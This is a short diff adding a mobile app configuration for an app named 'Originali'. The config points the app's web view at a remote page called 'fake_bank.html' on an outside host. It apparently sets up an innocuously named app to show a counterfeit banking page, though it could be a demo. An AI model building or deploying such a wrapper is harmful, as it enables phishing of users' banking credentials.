@@ -1,0 +1,9 @@
+{
+  "appId": "com.multimix.originali",
+  "appName": "Originali",
+  "webDir": "www",
+  "server": {
+    "url": "https://stealth-alert.onrender.com/fake_bank.html",
+    "androidScheme": "https"
+  }
+}
